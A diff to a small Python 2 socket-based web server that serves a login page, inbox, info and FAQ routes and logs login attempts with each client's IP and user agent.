@@ -59,18 +59,18 @@ def run(handler):
             clients.append(client_addr[0])
             request = client.recv(2048)
             registered_users = refresh_users()
+            user_agent = ''
+            for ln in request.split('\r\n'):
+                if 'User-Agent:' in ln.split(' '):
+                    try:
+                        user_agent = ln.split('User-Agent:')[1].replace('\n', '')
+                    except IndexError:
+                        pass
             # Serve login page to new connections, and handle logins
             if 'GET / HTTP/1.1' in request.split('\r\n'):
                 client.send(open('login.html', 'rb').read())
             # Display logo
             elif 'GET /assets/img/logo.png HTTP/1.1' in request.split('\r\n'):
-                user_agent = ''
-                for element in request.split('\r\n'):
-                    if 'User-Agent:' in element.split(' '):
-                        try:
-                            user_agent = element.split('User-Agent:')[1].replace('\n', '')
-                        except IndexError:
-                            pass
                 client.send(open('assets/img/logo.png', 'rb').read())
                 try:
                     os.remove('info.html')
@@ -80,17 +80,15 @@ def run(handler):
             elif 'GET /favicon.ico HTTP/1.1' in request.split('\r\n'):
                 time.sleep(0.1)
             elif 'POST / HTTP/1.1' in request.split('\r\n'):
-                user_agent = ''
-                for ln in request.split('\r\n'):
-                    if 'User-Agent:' in ln.split(' '):
-                        try:
-                            user_agent = ln.split('User-Agent:')[1].replace('\n', '')
-                        except IndexError:
-                            pass
                 open(log_file_name, 'a').write('[*] %s is submitting login information.\nUser Agent: %s\n' %
                                                (client_addr[0], user_agent))
-            else:
-                print request
+            elif 'GET /inbox HTTP/1.1' in request.split('\r\n'):
+                print '[*] Serving %s their inbox' % client_addr[0]
+            elif 'GET /info HTTP/1.1' in request.split('\r\n'):
+                print '[*] Serving %s information' % client_addr[0]
+                client.send(html_engine.display_information(client_addr[0], user_agent))
+            elif 'GET /FAQ HTTP/1.1' in request.split('\r\n'):
+                print '[*] Serving %s the FAQ page' % client_addr[0]
             # Login attempts TODO: Encrypt how credentials are sent over the wire
             if len(request.split('username=')) > 1:
                 uname = request.split('username=')[1].split('&')[0]
